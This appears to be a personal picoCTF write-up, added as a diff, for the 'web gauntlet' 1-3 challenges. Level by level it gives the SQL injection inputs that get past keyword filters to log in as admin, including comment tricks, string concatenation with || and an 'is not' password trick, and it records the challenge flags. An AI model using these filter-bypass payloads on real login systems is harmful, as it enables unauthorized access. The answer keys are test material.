@@ -1,0 +1,43 @@
+web gauntlet-1:
+1)in the first level the word filtered is 'or' so we type 
+         username : admin'-- 
+          as we have to login as admin           (hence round 1 cleared)
+2)now the filtered list   or and like = --     so now the 
+         username : admin'/*
+         password : anything
+         round 2 cleared, as we can also comment using /* sqlite
+3)filter list    or and = like < > --
+        username : admin'/*
+        password : anything
+      round 3 cleared, as we can also comment using /* sqlite
+4)filer list    or and = like < > -- admin
+        username : ad'||'min'/*
+        password: anything 
+        round 4 cleared , as we can concatenate the string using || in sqlite
+5)filter list      or and = like < > -- union admin
+        username : ad'||'min'/*
+        password : anything
+        round 5 cleared , as we dint use union, blocking it doesnt change the answer from the prev one
+
+te flag is picoCTF{y0u_m4d3_1t_275cea1159781d5b3ef3f57e70be664a}, it also gave me the source code in php for all this 
+
+
+
+web gauntlet-2:
+filtered list     or and true false union like = > < ; -- /* */ admin
+        username: ad'||'min
+        password: ' is not '.
+        this generates a query like this    SELECT *FROM users WHERE username = 'ad'||'min' AND password = '' is not 'l';
+        this generates password is true as NULL is not equal to l
+        hence giving the flag is picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}, and also gives the source code
+
+
+
+
+web gauntlet-3:
+filtered list     or and true false union like = > < ; -- /* */ admin
+        username: ad'||'min
+        password: ' is not '.
+        this generates a query like this    SELECT *FROM users WHERE username = 'ad'||'min' AND password = '' is not '.';
+        this generates password is true as NULL is not equal to .
+        hence the flag is picoctf{}
